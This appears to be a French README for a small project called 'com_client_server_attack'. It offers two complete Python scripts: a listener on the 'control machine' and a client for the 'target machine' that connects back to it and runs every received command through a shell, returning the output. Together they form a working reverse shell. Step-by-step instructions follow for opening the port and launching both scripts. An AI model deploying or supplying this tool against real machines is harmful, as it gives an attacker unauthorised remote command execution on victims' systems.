# com_client_server_attack
simple communication entre pc server et pc client(cible)

## Exemple Client/Serveur Python Fonctionnel
🔹 1. server.py – À exécuter sur ta machine de contrôle
```python
import socket
import subprocess

host = '0.0.0.0'   # écoute sur toutes les interfaces
port = 9999        # port à ouvrir

server = socket.socket()
server.bind((host, port))
server.listen(1)
print(f"[+] En attente de connexion sur {host}:{port}...")

conn, addr = server.accept()
print(f"[+] Connexion établie depuis {addr}")

while True:
    cmd = input("Commande à envoyer: ")
    if cmd.lower() in ['exit', 'quit']:
        conn.send(cmd.encode())
        break
    conn.send(cmd.encode())
    output = conn.recv(4096).decode()
    print(output)

conn.close()
```
🔹 2. client.py – À exécuter sur ta machine cible
```python
import socket
import subprocess

host = 'IP_DU_SERVEUR'  # <-- Remplace par l'adresse IP réelle du serveur
port = 9999

client = socket.socket()
client.connect((host, port))

while True:
    cmd = client.recv(1024).decode()
    if cmd.lower() in ['exit', 'quit']:
        break
    try:
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = e.output
    client.send(output)

client.close()
```
### 🔧 Étapes à suivre
Remplace IP_DU_SERVEUR dans client.py par la vraie IP de la machine serveur (commande : ip a ou ifconfig)

Ouvre le port si nécessaire avec :

```bash
sudo ufw allow 9999
```
Lance server.py sur la machine de contrôle :

```bash
python3 server.py
```
Puis client.py sur la machine cible :
```bash
python3 client.py
```
Tu pourras taper des commandes Linux:
- ls
- whoami
- pwd
- uname -a
        etc. dans le serveur et voir les résultats retournés par le client.


